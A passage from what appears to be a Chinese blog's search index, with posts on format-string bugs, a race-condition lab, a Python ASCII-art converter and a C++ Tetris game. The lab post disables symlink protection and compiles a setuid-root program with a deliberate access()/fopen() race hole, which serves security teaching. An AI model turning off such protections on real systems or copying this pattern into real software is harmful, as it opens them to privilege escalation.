&#x603B;&#x4E4B;&#xFF0C;&#x8FD8;&#x662F;&#x5BF9;&#x683C;&#x5F0F;&#x5316;&#x6F0F;&#x6D1E;&#x6709;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x81F4;&#x7684;&#x4E86;&#x89E3;&#xFF0C;&#x7A81;&#x7136;&#x5F00;&#x59CB;&#x6000;&#x7591;&#x81EA;&#x505A;&#x7684;&#x8FD9;&#x4E9B;&#x4E8B;&#x60C5;&#x662F;&#x4E0D;&#x662F;&#x6709;&#x610F;&#x4E49;&#x3002;&#x4E5F;&#x53D1;&#x73B0;&#x539F;&#x6765;hacker&#x5E76;&#x4E0D;&#x662F;&#x90A3;&#x4E48;&#x5BB9;&#x6613;&#x5C31;&#x80FD;&#x591F;&#x8FBE;&#x5230;&#x5F88;&#x9AD8;&#x7684;&#x6C34;&#x5E73;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Race condition vulnerability experiment]]></title>
    <url>%2F2018%2F10%2F02%2FRace-condition-vulnerability-experiment%2F</url>
    <content type="text"><![CDATA[&#x7ADE;&#x6001;&#x6761;&#x4EF6;&#x6F0F;&#x6D1E;&#x5B9E;&#x9A8C; $ sudo su$ echo 0 &gt; /proc/sys/fs/protected_symlinks$ exit fs.protected_symlinks&#x7528;&#x4E8E;&#x9650;&#x5236;&#x666E;&#x901A;&#x7528;&#x6237;&#x5EFA;&#x7ACB;&#x8F6F;&#x94FE;&#x63A5;0&#xFF1A;&#x4E0D;&#x9650;&#x5236;&#x7528;&#x6237;&#x5EFA;&#x7ACB;&#x8F6F;&#x94FE;&#x63A5;1&#xFF1A;&#x9650;&#x5236;&#xFF0C;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x5EFA;&#x7ACB;&#x8F6F;&#x8FDE;&#x63A5;&#x7684;&#x60C5;&#x51B5;&#x662F; &#x8F6F;&#x8FDE;&#x63A5;&#x6240;&#x5728;&#x76EE;&#x5F55;&#x662F;&#x5168;&#x5C40;&#x53EF;&#x8BFB;&#x5199;&#x76EE;&#x5F55;&#x6216;&#x8005;&#x8F6F;&#x8FDE;&#x63A5;&#x7684;uid&#x4E0E;&#x8DDF;&#x4ECE;&#x8005;&#x7684;uid&#x5339;&#x914D;&#xFF0C;&#x53C8;&#x6216;&#x8005;&#x76EE;&#x5F55;&#x6240;&#x6709;&#x8005;&#x4E0E;&#x8F6F;&#x8FDE;&#x63A5;&#x6240;&#x6709;&#x8005;&#x5339;&#x914D; $ cd /home/shiyanlou/seed$ sudo vi vulp.c 12345678910111213141516171819202122232425/* vulp.c */#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#define DELAY 10000int main(){ char * fn = &quot;/tmp/XYZ&quot;; char buffer[60]; FILE *fp; long int i; /* get user input */ scanf(&quot;%50s&quot;, buffer ); if(!access(fn, W_OK)){ for(i=0; i &lt; DELAY; i++){ int a = i^2; } fp = fopen(fn, &quot;a+&quot;); fwrite(&quot;\n&quot;, sizeof(char), 1, fp); fwrite(buffer, sizeof(char), strlen(buffer), fp); fclose(fp); } else printf(&quot;No permission \n&quot;);} &#x5B9E;&#x9A8C;1: &#x5229;&#x7528;&#x7ADE;&#x6001;&#x6761;&#x4EF6;&#x6F0F;&#x6D1E;123456$ ls -l-rw-rw-r-- 1 shiyanlou shiyanlou 10 Apr 23 13:33 append_text &#x300A;--VULP&#x8F93;&#x5165;&#x6587;&#x4EF6;-rw-rw-r-- 1 root root 0 Apr 23 13:32 root_file &#x300A;--&#x76EE;&#x6807;&#x6587;&#x4EF6;-rw-rw-r-- 1 shiyanlou shiyanlou 0 Apr 23 13:45 tmp_file &#x300A;--&#x52A9;&#x653B;-rwsr-xr-x 1 root root 7403 Apr 23 13:27 vulp &#x300A;--&#x6F0F;&#x6D1E;&#x6587;&#x4EF6;-rw-r--r-- 1 root root 454 Apr 23 13:27 vulp.c $ sudo gcc vulp.c -o vulp document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python image convert string]]></title>
    <url>%2F2018%2F10%2F02%2FPython-image-convert-string%2F</url>
    <content type="text"><![CDATA[&#x901A;&#x8FC7;&#x5E94;&#x7528;pillow&#x5E93;&#x548C;Argparse&#x5E93;&#x6765;&#x5B9E;&#x73B0;&#x56FE;&#x7247;&#x8F6C;&#x5B57;&#x7B26;&#x753B;&#x7684;&#x529F;&#x80FD;&#x3002; code:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from PIL import Imageimport argparse#&#x547D;&#x4EE4;&#x884C;&#x8F93;&#x5165;&#x53C2;&#x6570;&#x5904;&#x7406;parser = argparse.ArgumentParser()parser.add_argument(&apos;file&apos;) #&#x8F93;&#x5165;&#x6587;&#x4EF6;parser.add_argument(&apos;-o&apos;, &apos;--output&apos;) #&#x8F93;&#x51FA;&#x6587;&#x4EF6;parser.add_argument(&apos;--width&apos;, type = int, default = 80) #&#x8F93;&#x51FA;&#x5B57;&#x7B26;&#x753B;&#x5BBD;parser.add_argument(&apos;--height&apos;, type = int, default = 80) #&#x8F93;&#x51FA;&#x5B57;&#x7B26;&#x753B;&#x9AD8;#&#x83B7;&#x53D6;&#x53C2;&#x6570;args = parser.parse_args()IMG = args.fileWIDTH = args.widthHEIGHT = args.heightOUTPUT = args.outputascii_char = list(&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1{}[]?-_+~&lt;&gt;i!lI;:,\&quot;^`&apos;. &quot;)# &#x5C06;256&#x7070;&#x5EA6;&#x6620;&#x5C04;&#x5230;70&#x4E2A;&#x5B57;&#x7B26;&#x4E0A;def get_char(r,g,b,alpha = 256): if alpha == 0: return &apos; &apos; length = len(ascii_char) gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b) unit = (256.0 + 1)/length return ascii_char[int(gray/unit)]if __name__ == &apos;__main__&apos;: im = Image.open(IMG) im = im.resize((WIDTH,HEIGHT), Image.NEAREST) txt = &quot;&quot; for i in range(HEIGHT): for j in range(WIDTH): txt += get_char(*im.getpixel((j,i))) txt += &apos;\n&apos; print(txt) #&#x5B57;&#x7B26;&#x753B;&#x8F93;&#x51FA;&#x5230;&#x6587;&#x4EF6; if OUTPUT: with open(OUTPUT,&apos;w&apos;) as f: f.write(txt) else: with open(&quot;output.txt&quot;,&apos;w&apos;) as f: f.write(txt) &#x5904;&#x7406;&#x8FC7;&#x4E4B;&#x540E;&#x7684;&#x201C;&#x54C6;&#x5566;A&#x68A6;&#x201D;&#xFF1A; $$$$ $$d0x0o#uxx0z#$$ $WcxxxxW &quot;kx} &quot;hd$ $qxxxxxxJ &quot;c Wxd$ $#xxxxxxxch # cxu$ $uxxxxxxxxk&gt; p&quot;- h} #xxxB $0xxxxxxxxxx# # n &quot;h I# nxxxx$ $Yxxxxxxxxxxx# I }C -qcxxx$ $Yxxxxxxxxxxxq#( &quot;- z -occ$ $xxxxxxxxxxc#(Ip ( COC( h pu$ $xxxxxxxxxuh &quot;&gt; n}p zk8&quot; &quot;8$$$ mxxxxxxxxk&quot; &gt;C ff &amp;\ kk }#&gt;# $ $xxxxxxxx# -Cp} ok\kkk&gt; C( &quot;$ cxxxxxxxW }zh( @kkkko &gt; $ $xxxxxxxq }h 8kko( p mxxxxxxx&gt; - #pnf----I p $xxxxxxuW &gt;nn---I O $ $xxxxxx#&quot; -&gt; p I Wxxxxxx&gt; n- OhnI $ qxxxxx0 }&amp;%%%pOn}I (( -n }Oh$ Jxxxxx# &quot;kkkkkkka8%*aW%pn- -n }CI$ Jxxxxxp -kkkkkWB8akkkkkkoWBhp}I &gt;z# $ cxxxxx} nk*%okkkkkkkkkkkkkkkkkkkkkkkk&quot; $ Jxxxxx nkkkkkkkkkkkkkkkkkkkkkkkkkkk% $ Jxxxxx Ikkkkkkkkkkkkkkkkkkkkkkkkkkk- qxxxxx akkkkkkkkkkkkkkkkkkkkkkkkkB f Wxxxxx 8kkkaW%8#kkkkkkkkkkkkkkkkh&quot; 8 $xxxxx Ik&amp;YffffffQBhkkkkkkkkkkkkO z$ $xxxxx( $ffffffffffx@kkkkkkkkkkB $ mxxxx# &quot;ufffffffffffbkkkkkkkk# I $xxxxY nffffffffffffMkkkkkka&quot; 8 uxxxxf hffffffffffffWkkkka&gt; I qxxxx# &quot;Qfffffffffff%kkkkW O $xxxxcp &quot;bffffffffffckkk8 &quot;$ dxxxxc omfffffffffa8C $ $xxxxxW CQffffffQz 8 $xxxxx} &gt;hbpo( 8 #xxxxY&quot; -(O%$} IBkkkkkkkoB 0xxxx0 &gt;O%*kkkkB k#j&gt;Ij#kk$ $Jxxm8akkkkoWW&amp;&quot; Jwj1j0C($ $$okkk*&amp;Lxxxxd h_IIIIM $ $Wkh8qxxxxxxx# OIIXbIX * $mxxxxxxxxxxq aII[wI# z cxxxxxxxxxxxI uIII\j - Jxxxxxxxxxxxp fhIII_h &gt; kxxxxxxxxxxx0p n&quot; -( $xxxxxxxxxJh &gt;p8#phpCnnnCppI$ $$$ $xxxxxxuWcx pf p$ $} n$ $xxxJ#dxxx0 n n$8 f xxxxxxxxx# p z$ $ Jxxxxxxxx# O h&quot; h kxxxxxxxx# &quot; &quot;8 O Bxxxxxxxxm p pI p $$$ $xxxxxxxxxI h &quot;O} 8 #kkk$$xxxxxxxxx8 &quot;hn- --zO $ $ $kkkk%$xxxxxxxxxJ -npnn- fh $ $kkkkM$xxxxxxxxxxk CxC } akkk$$xxxxxxxxxxxq&gt; Wxxz $ $$$$ Bxxxxxxxxxxxxx8} fhcxxxh I qxxxxxxxxxxxxxxxxJYxxxxxxxm $ JxxxxxxxxxxxxxxxxxxxxxxxJd#( h $$xxxxxxxxxxxxxxxxxxxJW$$ $- 8 h&quot; xxxxxxxxxxxxxxxxc@$ $pp$$ $ uxxxxxxxxxxxxx0$ O #xxxxxxxxxxxJ$ &gt; &gt;xxxxxxxxxu$ Cxxxxxxuk$ #xxxxx8$ (ocJ$ - 8 O $ $ O $ $&quot; n $*I p$ $$$ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[using c++ to realize Tetris]]></title>
    <url>%2F2018%2F10%2F01%2Fusing-c-to-realize-Tetris%2F</url>
    <content type="text"><![CDATA[&#x8FD9;&#x4E24;&#x5929;&#x5B66;&#x4E60;&#x4E86;&#x4E00;&#x4E0B;&#x600E;&#x4E48;&#x7528;c++&#x6765;&#x5B9E;&#x73B0;&#x4FC4;&#x7F57;&#x65AF;&#x65B9;&#x5757;&#xFF0C;&#x867D;&#x7136;&#x6700;&#x540E;&#x7684;&#x754C;&#x9762;&#x5F88;&#x611F;&#x4EBA;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x4E2D;&#x8FD8;&#x662F;&#x5B66;&#x5230;&#x4E86;&#x4E0D;&#x5C11;&#x7684;&#x4E1C;&#x897F;&#x3002;code&#xFF1A; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495#include &lt;iostream&gt;#include &lt;sys/time.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;#include &lt;ncurses.h&gt;#include &lt;unistd.h&gt;using namespace std;void swap(int &amp;a, int &amp;b){ int t=a; a = b; b = t;}int getrand(int min, int max){ return(min+rand()%(max-min+1));}WINDOW *create_newwin(int height,int width,int starty,int startx);void destory_win(WINDOW *local_win);int game_win_height=30; int game_win_width=45;int hint_win_height=10;int hint_win_width=20;WINDOW * game_win, *hint_win ,*score_win;int key;class Piece{public: int score; int shape; int next_shape; int head_x; // &#x5F53;&#x524D;&#x65B9;&#x5757;&#x9996;&#x4E2A;box&#x7684;&#x4F4D;&#x7F6E; int head_y; int size_h; int size_w; int next_size_h; int next_size_w; int box_shape[4][4]; int next_box_shape[4][4]; int box_map[30][45]; bool game_over;public: void initial(); void set_shape(int &amp;cshape, int box_shape[][4],int &amp;size_w, int &amp; size_h); void score_next(); void judge(); void move(); void rotate(); bool isaggin(); bool exsqr(int row); };int main(){ initscr(); //raw(); cbreak(); noecho(); curs_set(0); keypad(stdscr,TRUE); refresh(); game_win = create_newwin(game_win_height, game_win_width, 0,0); wborder(game_win, &apos;*&apos;, &apos;*&apos;, &apos;*&apos;, &apos;*&apos;, &apos;*&apos;, &apos;*&apos;, &apos;*&apos;, &apos;*&apos;); wrefresh(game_win); hint_win = create_newwin(hint_win_height, hint_win_width, 0, game_win_width+10); mvprintw(0, game_win_width+10+2,&quot;%s&quot;,&quot;Next&quot;); refresh(); score_win = create_newwin(hint_win_height, hint_win_width, 20, game_win_width+10); mvprintw(20, game_win_width+10+2,&quot;%s&quot;,&quot;Score&quot;); refresh(); Piece* pp = new Piece; pp-&gt;initial(); while(1) { pp-&gt;move(); if(pp-&gt;game_over) break; } destory_win(game_win); destory_win(hint_win); destory_win(score_win); delete pp; system(&quot;clear&quot;); int row,col; getmaxyx(stdscr,row,col); mvprintw(row/2,col/2 ,&quot;%s&quot;,&quot;GAMER OVER ! \n &quot;); mvprintw(row/2+2,col/2-2 ,&quot;%s&quot;,&quot;Wait 5s to return tthe erminal ! \n &quot;); refresh(); sleep(5); endwin(); return 0;}WINDOW *create_newwin(int height, int width, int starty, int startx){ WINDOW *local_win; local_win = newwin(height, width, starty, startx); box(local_win,0,0); wrefresh(local_win); return local_win;}void destory_win(WINDOW *local_win){ wborder(local_win, &apos; &apos;, &apos; &apos;, &apos; &apos;, &apos; &apos;, &apos; &apos;, &apos; &apos;, &apos; &apos;, &apos; &apos;); wrefresh(local_win); delwin(local_win);}void Piece::initial(){ score=0; game_over=false; for(int i =0;i&lt;game_win_height;i++) for(int j=0;j&lt;game_win_width;j++){ if(i==0 || i==game_win_height-1 || j==0 || j==game_win_width-1){ box_map[i][j]=1; } else box_map[i][j]=0; } srand((unsigned)time(0)); shape=getrand(0,6); set_shape(shape,box_shape,size_w,size_h); next_shape=getrand(0,6); set_shape(next_shape,next_box_shape,next_size_w,next_size_h); for(int i =0;i&lt;4;i++) for(int j=0;j&lt;4;j++) if(next_box_shape[i][j]==1){ mvwaddch(hint_win,(hint_win_height-size_h)/2+i,(hint_win_width-size_w)/2+j,&apos;#&apos;); wrefresh(hint_win); } mvwprintw(score_win, hint_win_height/2,hint_win_width/2-2,&quot;%d&quot;,score); wrefresh(score_win);}void Piece::set_shape(int &amp;cshape, int shape[][4],int &amp;size_w,int &amp;size_h){ int i,j; for(i=0;i&lt;4;i++) for(j=0;j&lt;4;j++) shape[i][j]=0; switch(cshape) { case 0: // &quot;####&quot; size_h=1; size_w=4; shape[0][0]=1; shape[0][1]=1; shape[0][2]=1; shape[0][3]=1; break; case 1: // &quot;#&quot; size_h=2; // &quot;###&quot; size_w=3; shape[0][0]=1; shape[1][0]=1; shape[1][1]=1; shape[1][2]=1; break; case 2: // &quot; #&quot; size_h=2; // &quot;###&quot; size_w=3; shape[0][2]=1; shape[1][0]=1; shape[1][1]=1; shape[1][2]=1; break; case 3: // &quot; ##&quot; size_h=2; // &quot;##&quot; size_w=3; shape[0][1]=1; shape[0][2]=1; shape[1][0]=1; shape[1][1]=1; break; case 4: // &quot;##&quot; size_h=2; // &quot; ##&quot; size_w=3; shape[0][0]=1; shape[0][1]=1; shape[1][1]=1; shape[1][2]=1; break; case 5: // &quot;##&quot; size_h=2; // &quot;##&quot; size_w=2; shape[0][0]=1; shape[0][1]=1; shape[1][0]=1; shape[1][1]=1; break; case 6: // &quot; #&quot; size_h=2; // &quot;###&quot; size_w=3; shape[0][1]=1; shape[1][0]=1; shape[1][1]=1; shape[1][2]=1; break; } head_x=game_win_width/2; // &#x521D;&#x59CB;&#x5316;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E; head_y=1; if(isaggin()) /* GAME OVER ! */ game_over=true;}void Piece::rotate(){ int temp[4][4]={0}; int temp_piece[4][4]={0}; int i,j,tmp_size_h,tmp_size_w; tmp_size_w=size_w; tmp_size_h=size_h; for(int i=0; i&lt;4;i++) for(int j=0;j&lt;4;j++) temp_piece[i][j]=box_shape[i][j]; for(i=0;i&lt;4;i++) for(j=0;j&lt;4;j++) temp[j][i]=box_shape[i][j]; i=size_h; size_h=size_w; size_w=i; for(i=0;i&lt;size_h;i++) for(j=0;j&lt;size_w;j++) box_shape[i][size_w-1-j]=temp[i][j]; if(isaggin()){ for(int i=0; i&lt;4;i++) for(int j=0;j&lt;4;j++) box_shape[i][j]=temp_piece[i][j]; size_w=tmp_size_w; size_h=tmp_size_h; } else{ for(int i=0; i&lt;4;i++) for(int j=0;j&lt;4;j++){ if(temp_piece[i][j]==1){ mvwaddch(game_win,head_y+i,head_x+j,&apos; &apos;); wrefresh(game_win); } } for(int i=0; i&lt;size_h;i++) for(int j=0;j&lt;size_w;j++){ if(this-&gt;box_shape[i][j]==1){ mvwaddch(game_win,head_y+i,head_x+j,&apos;#&apos;); wrefresh(game_win); } } }}void Piece::move(){ fd_set set; FD_ZERO(&amp;set); FD_SET(0, &amp;set); struct timeval timeout; timeout.tv_sec = 0; timeout.tv_usec= 500000; // timeout&#x8BBE;&#x7F6E;&#x4E3A;&#x6700;&#x591A;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#xFF0C;&#x8D85;&#x8FC7;&#x8FD9;&#x4E2A;&#x65F6;&#x95F4;&#x5C06;&#x4E0D;&#x518D;&#x7B49;&#x5F85;getchar if (select(1, &amp;set, NULL, NULL, &amp;timeout) == 0){ head_y++; if(isaggin()){ head_y--; for(int i=0;i&lt;size_h;i++) for(int j=0;j&lt;size_w;j++) if(box_shape[i][j]==1) box_map[head_y+i][head_x+j]=1; score_next(); } else{ for(int i=size_h-1; i&gt;=0;i--) for(int j=0;j&lt;size_w;j++){ if(this-&gt;box_shape[i][j]==1){ mvwaddch(game_win,head_y-1+i,head_x+j,&apos; &apos;); mvwaddch(game_win,head_y+i,head_x+j,&apos;#&apos;); } } wrefresh(game_win); } } if (FD_ISSET(0, &amp;set)) { // &#x5982;&#x679C;&#x5728;&#x89C4;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x5185;&#x68C0;&#x6D4B;&#x5230;&#x6309;&#x952E;&#xFF0C;&#x5F97;&#x5230;&#x8F93;&#x5165;key = getchar(); while ((key = getch()) == -1) ; if(key==KEY_LEFT){ // &#x8FDB;&#x884C;&#x76F8;&#x5173;&#x7684;&#x4E0A;&#x4E0B;&#x5DE6;&#x53F3;&#x7684;&#x79FB;&#x52A8; head_x--; if(isaggin()) head_x++; //undo else{ for(int i=0; i&lt;size_h;i++) for(int j=0;j&lt;size_w;j++){ if(this-&gt;box_shape[i][j]==1){ mvwaddch(game_win,head_y+i,head_x+j+1,&apos; &apos;); mvwaddch(game_win,head_y+i,head_x+j,&apos;#&apos;); } } wrefresh(game_win); } } if(key==KEY_RIGHT){ head_x++; if(isaggin()) head_x--; else{ for(int i=0; i&lt;size_h;i++) for(int j=size_w-1;j&gt;=0;j--){ if(this-&gt;box_shape[i][j]==1){ mvwaddch(game_win,head_y+i,head_x+j-1,&apos; &apos;); mvwaddch(game_win,head_y+i,head_x+j,&apos;#&apos;); } } wrefresh(game_win); } } if(key==KEY_DOWN){ head_y++; if(isaggin()){ head_y--; for(int i=0;i&lt;size_h;i++) for(int j=0;j&lt;size_w;j++) if(box_shape[i][j]==1) box_map[head_y+i][head_x+j]=1; score_next(); } else{ for(int i=size_h-1; i&gt;=0;i--) for(int j=0;j&lt;size_w;j++){ if(this-&gt;box_shape[i][j]==1){ mvwaddch(game_win,head_y-1+i,head_x+j,&apos; &apos;); mvwaddch(game_win,head_y+i,head_x+j,&apos;#&apos;); } } wrefresh(game_win); } } if(key==KEY_UP) rotate(); if(head_x+size_w+1&gt;game_win_width) head_x=game_win_width-size_w-1; if(head_x&lt;1) head_x=1; }}bool Piece::isaggin(){ // &#x5224;&#x65AD;&#x56FE;&#x5F62;&#x662F;&#x5426;&#x4E0E;&#x8FB9;&#x754C;&#x6216;&#x5176;&#x4ED6;&#x56FE;&#x5F62;&#x4EA7;&#x751F;&#x51B2;&#x7A81;&#x3002; for(int i=0;i&lt;size_h;i++) for(int j=0;j&lt;size_w;j++){ if(box_shape[i][j]==1){ if(head_y+i &gt; game_win_height-2) // &#x9AD8; return true; if(head_x+j &gt; game_win_width-2 || head_x+i-1&lt;0) // &#x5BBD; return true; if(box_map[head_y+i][head_x+j]==1) // &#x5176;&#x4ED6;&#x56FE;&#x5F62; return true ; } } return false;}bool Piece::exsqr(int row){ // &#x68C0;&#x67E5;&#x5F53;&#x524D;&#x884C;&#x662F;&#x5426;&#x662F;&#x7A7A;&#x884C; for(int j=1;j&lt;game_win_width-1;j++) if(box_map[row][j]==1) return true; return false;}void Piece::judge(){ // &#x5224;&#x65AD;&#x5F53;&#x524D;&#x884C;&#x662F;&#x5426;&#x5DF2;&#x6EE1; int i,j; int line=0; bool full; for(i=1;i&lt;game_win_height-1;i++){ full=true; for(j=1;j&lt;game_win_width-1;j++){ if(box_map[i][j]==0) full=false; } if(full){ line++; // &#x6807;&#x8BB0;&#x5DF2;&#x6EE1;&#x7684;&#x884C;&#x6570; score+=50; // &#x5982;&#x679C;&#x5F53;&#x524D;&#x884C;&#x5DF2;&#x6EE1;&#xFF0C;&#x5219;&#x5BF9;&#x5E94;&#x7684;&#x5206;&#x6570;+50&#xFF0C;&#x5E76;&#x5C06;&#x5F53;&#x524D;&#x884C;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x5143;&#x7D20;&#x5236;0 for(j=1;j&lt;game_win_width-1;j++) box_map[i][j]=0; } } if(line!=0){ for(i=game_win_height-2;i&gt;=2;i--){ // &#x4ECE;&#x6700;&#x5E95;&#x5C42;&#x5F00;&#x59CB;&#x5224;&#x65AD; int s=i; if(exsqr(i)==0){ // &#x5224;&#x65AD;&#x5F53;&#x524D;&#x884C;&#x662F;&#x5426;&#x662F;&#x7A7A;&#x884C; while(s&gt;1 &amp;&amp; exsqr(--s)==0); // &#x5411;&#x4E0A;&#x5BFB;&#x627E;&#xFF0C;&#x76F4;&#x5230;&#x51FA;&#x73B0;&#x4E0D;&#x662F;&#x7A7A;&#x884C;&#x7684;&#x884C; for(j=1;j&lt;game_win_width-1;j++){ box_map[i][j]=box_map[s][j]; box_map[s][j]=0; // &#x5C06;&#x4E0D;&#x662F;&#x7A7A;&#x884C;&#x7684;&#xFF0C;&#x79FB;&#x52A8;&#x5230;&#x6700;&#x4E0B;&#x5C42;&#x7684;&#x7A7A;&#x884C;&#x5904;&#xFF0C;&#x5E76;&#x5C06;&#x79FB;&#x52A8;&#x8FC7;&#x4E4B;&#x540E;&#x7684;&#x4F4D;&#x7F6E;&#x5236;0 } } } for(int i=1;i&lt;game_win_height-1;i++) // &#x5237;&#x65B0;&#x5C4F;&#x5E55; for(int j=1;j&lt;game_win_width-1;j++){ if(box_map[i][j]==1){ mvwaddch(game_win,i,j,&apos;#&apos;); wrefresh(game_win); } else{ mvwaddch(game_win,i,j,&apos; &apos;); wrefresh(game_win); } } }} void Piece::score_next(){ score+=10; judge(); mvwprintw(score_win, hint_win_height/2,hint_win_width/2-2,&quot;%d&quot;,score); // &#x663E;&#x793A;&#x5206;&#x6570; wrefresh(score_win); set_shape(next_shape,box_shape,size_w,size_h); this-&gt;next_shape=getrand(0,6); // &#x663E;&#x793A;&#x4E0B;&#x4E00;&#x4E2A;&#x56FE;&#x5F62; set_shape(next_shape,next_box_shape,next_size_w,next_size_h); for(int i =1;i&lt;hint_win_height-1;i++) for(int j=1;j&lt;hint_win_width-1;j++){ mvwaddch(hint_win, i, j,&apos; &apos;); wrefresh(hint_win); } for(int i =0;i&lt;4;i++) for(int j=0;j&lt;4;j++) if(next_box_shape[i][j]==1){ mvwaddch(hint_win,(hint_win_height-size_h)/2+i,(hint_win_width-size_w)/2+j,&apos;#&apos;); wrefresh(hint_win); }} &#x5728;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E5F;&#x5B66;&#x5230;&#x4E86;c++&#x7684;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x7684;&#x77E5;&#x8BC6;&#x3002; select&#x51FD;&#x6570; &#x7528;&#x6CD5; c++ select&#x51FD;&#x6570;&#x7528;&#x4E8E;&#x5728;&#x975E;&#x963B;&#x585E;&#x4E2D;&#xFF0C;&#x5F53;&#x4E00;&#x4E2A;&#x5957;&#x63A5;&#x5B57;&#x6216;&#x4E00;&#x7EC4;&#x5957;&#x63A5;&#x5B57;&#x6709;&#x4FE1;&#x53F7;&#x65F6;&#x901A;&#x77E5;&#x4F60;&#xFF0C;&#x7CFB;&#x7EDF;&#x63D0;&#x4F9B;select&#x51FD;&#x6570;&#x6765;&#x5B9E;&#x73B0;&#x591A;&#x8DEF;&#x590D;&#x7528;&#x8F93;&#x5165;/&#x8F93;&#x51FA;&#x6A21;&#x578B;&#xFF0C;&#x539F;&#x578B;&#xFF1A;int select(int maxfd,fd_set rdset,fd_set wrset,fd_set exset,struct timeval timeout);&#x6240;&#x5728;&#x7684;&#x5934;&#x6587;&#x4EF6;&#x4E3A;&#xFF1A;#include &lt;sys/time.h&gt; &#x548C;#include &lt;unistd.h&gt;&#x5148;&#x5BF9;&#x51FD;&#x6570;&#x4E2D;&#x7684;&#x53C2;&#x6570;&#x505A;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4ECB;&#x7ECD;&#x3002;&#x53C2;&#x6570;maxfd&#x662F;&#x9700;&#x8981;&#x76D1;&#x89C6;&#x7684;&#x6700;&#x5927;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x503C;+1&#xFF1B;rdset,wrset,exset&#x5206;&#x522B;&#x5BF9;&#x5E94;&#x4E8E;&#x9700;&#x8981;&#x68C0;&#x6D4B;&#x7684;&#x53EF;&#x8BFB;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x7684;&#x96C6;&#x5408;&#xFF0C;&#x53EF;&#x5199;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x7684;&#x96C6; &#x5408;&#x53CA;&#x5F02;&#x5E38;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x7684;&#x96C6;&#x5408;&#x3002;struct timeval&#x7ED3;&#x6784;&#x7528;&#x4E8E;&#x63CF;&#x8FF0;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x957F;&#x5EA6;&#xFF0C;&#x5982;&#x679C;&#x5728;&#x8FD9;&#x4E2A;&#x65F6;&#x95F4;&#x5185;&#xFF0C;&#x9700;&#x8981;&#x76D1;&#x89C6;&#x7684;&#x63CF;&#x8FF0;&#x7B26;&#x6CA1;&#x6709;&#x4E8B;&#x4EF6;&#x53D1;&#x751F;&#x5219;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#xFF0C;&#x8FD4;&#x56DE;&#x503C;&#x4E3A;0&#x3002; &#x4F5C;&#x8005;&#xFF1A;shuolol&#x94FE;&#x63A5;&#xFF1A;https://www.jianshu.com/p/b5d7b7c6b9f7&#x4F86;&#x6E90;&#xFF1A;&#x7B80;&#x4E66;&#x7B80;&#x4E66;&#x8457;&#x4F5C;&#x6743;&#x5F52;&#x4F5C;&#x8005;&#x6240;&#x6709;&#xFF0C;&#x4EFB;&#x4F55;&#x5F62;&#x5F0F;&#x7684;&#x8F6C;&#x8F7D;&#x90FD;&#x8BF7;&#x8054;&#x7CFB;&#x4F5C;&#x8005;&#x83B7;&#x5F97;&#x6388;&#x6743;&#x5E76;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#x3002; addch(), echochar(), mvaddch(), 